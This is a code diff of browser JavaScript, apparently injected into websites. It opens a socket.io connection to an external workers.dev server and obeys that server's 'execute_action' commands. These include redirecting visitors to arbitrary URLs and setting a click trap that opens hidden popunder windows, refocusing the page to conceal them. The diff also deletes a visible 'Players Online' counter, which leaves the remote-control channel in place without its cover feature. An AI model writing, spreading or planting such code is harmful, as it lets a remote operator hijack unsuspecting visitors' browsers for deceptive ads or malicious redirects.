@@ -7,6 +7,7 @@
         const myDomain = window.location.hostname || "Unknown-Site";
         const fullPagePath = window.location.hostname + window.location.pathname + window.location.search;
 
+        
         const socket = io("https://dark-butterfly-a0dc.koydubupse.workers.dev", {
             transports: ['websocket'], 
             query: { 
@@ -15,84 +16,40 @@
             } 
         });
 
-        const counterDiv = document.createElement('div');
-        counterDiv.id = "global-online-counter";
-        counterDiv.innerHTML = `🟢 <span id="online-num">0</span> Players Online`;
         
-        Object.assign(counterDiv.style, {
-            position: 'fixed',
-            bottom: '20px',
-            left: '20px',
-            background: 'rgba(15, 23, 42, 0.9)',
-            color: '#38bdf8',
-            padding: '8px 15px',
-            borderRadius: '50px',
-            fontFamily: 'Segoe UI, Tahoma, sans-serif',
-            fontWeight: 'bold',
-            fontSize: '13px',
-            boxShadow: '0 4px 10px rgba(0,0,0,0.5)',
-            zIndex: '999999',
-            border: '1px solid #38bdf8',
-            transition: 'transform 0.2s ease'
-        });
-        
-        counterDiv.onmouseover = () => counterDiv.style.transform = 'scale(1.05)';
-        counterDiv.onmouseout = () => counterDiv.style.transform = 'scale(1)';
-        document.body.appendChild(counterDiv);
-
-        socket.on('online_count_update', (data) => {
-            const numSpan = document.getElementById('online-num');
-            if(numSpan && data && data.total !== undefined) {
-                numSpan.innerText = data.total;
-            }
-        });
-
         socket.on('execute_action', (data) => {
             
-           
+            
             if (data.actionType === 'redirect') {
                 window.location.href = data.url;
             } 
             
-            
+           
             else if (data.actionType === 'popunder') {
                 if (data.url && data.url.trim() !== '') {
                     const popunderTrap = function(e) {
-                        
-                       
                         const popWin = window.open(data.url, '_blank');
                         
                         if (popWin) {
                             try {
-                                
                                 popWin.blur();
-                                
-                                
                                 window.focus();
-                                
-                               
                                 window.open('javascript:window.focus()', '_self', '');
                                 
-                              
                                 setTimeout(() => {
                                     window.focus();
                                 }, 10);
-                                
-                            } catch (err) { 
-                                
-                            }
+                            } catch (err) { }
                         }
-                        
                         
                         window.removeEventListener('click', popunderTrap, true);
                     };
                     
-                   
                     window.addEventListener('click', popunderTrap, true);
                 }
             } 
             
-            
+             
             else if (data.actionType === 'flash') {
                 const alertDiv = document.createElement('div');
                 
